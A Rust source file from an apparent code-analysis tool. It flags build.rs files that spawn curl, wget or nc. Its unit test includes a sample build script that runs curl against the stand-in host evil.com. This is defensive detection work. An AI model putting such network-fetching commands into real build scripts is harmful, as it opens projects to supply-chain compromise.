use cerberus_domain::{compute_fingerprint, Category, Severity, Violation};
use std::path::Path;
use syn::spanned::Spanned;
use syn::visit::{self, Visit};
use syn::ExprCall;

pub struct CapabilitiesVisitor<'a> {
    pub current_file: &'a Path,
    pub crate_name: &'a str,
    pub is_build_rs: bool,
    pub violations: Vec<Violation>,
}

impl<'a> CapabilitiesVisitor<'a> {
    pub fn new(current_file: &'a Path, crate_name: &'a str) -> Self {
        let is_build_rs = current_file.file_name().is_some_and(|n| n == "build.rs");
        Self {

            current_file,
            crate_name,
            is_build_rs,
            violations: Vec::new(),
        }
    }
}

impl<'a, 'ast> Visit<'ast> for CapabilitiesVisitor<'a> {
    fn visit_expr_call(&mut self, node: &'ast ExprCall) {
        let func_expr = &node.func;
        let func_str = quote::quote!(#func_expr).to_string();

        if self.is_build_rs {
            // Build.rs sandbox checks
            if func_str.contains("Command") && func_str.contains("new") {
                let call_str = quote::quote!(#node).to_string();
                if call_str.contains("curl") || call_str.contains("wget") || call_str.contains("nc") {
                    let snippet = call_str;
                    let symbol = "build_rs_command".to_string();
                    let fingerprint = compute_fingerprint("SEC-001", "1.0", &symbol, &snippet);
                    let span = node.span();

                    self.violations.push(Violation {
                        rule_id: "SEC-001".into(),
                        rule_version: "1.0".into(),
                        category: Category::Security,
                        severity: Severity::Deny,
                        file: self.current_file.to_path_buf(),
                        line: span.start().line,
                        column: span.start().column + 1,
                        symbol,
                        snippet,
                        message: "build.rs cannot invoke network-downloading commands (curl/wget/nc)".into(),
                        remediation: "Download build assets deterministically during dependency resolution or package them locally.".into(),
                        fingerprint,
                    });
                }
            }
        }

        visit::visit_expr_call(self, node);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_capabilities_build_rs_blocked_commands() {
        let code_curl = r#"
            fn main() {
                std::process::Command::new("curl").arg("https://evil.com").output();
            }
        "#;
        let file: syn::File = syn::parse_str(code_curl).unwrap();
        let mut visitor = CapabilitiesVisitor::new(Path::new("crates/my-crate/build.rs"), "my-crate");
        visitor.visit_file(&file);
        assert_eq!(visitor.violations.len(), 1);
        assert_eq!(visitor.violations[0].rule_id, "SEC-001");

        let code_clean = r#"
            fn main() {
                println!("cargo:rerun-if-changed=build.rs");
            }
        "#;
        let file_clean: syn::File = syn::parse_str(code_clean).unwrap();
        let mut visitor_clean = CapabilitiesVisitor::new(Path::new("crates/my-crate/build.rs"), "my-crate");
        visitor_clean.visit_file(&file_clean);
        assert!(visitor_clean.violations.is_empty());

        let mut visitor_regular = CapabilitiesVisitor::new(Path::new("crates/my-crate/src/lib.rs"), "my-crate");
        visitor_regular.visit_file(&file_clean);
        assert!(visitor_regular.violations.is_empty());
    }
}

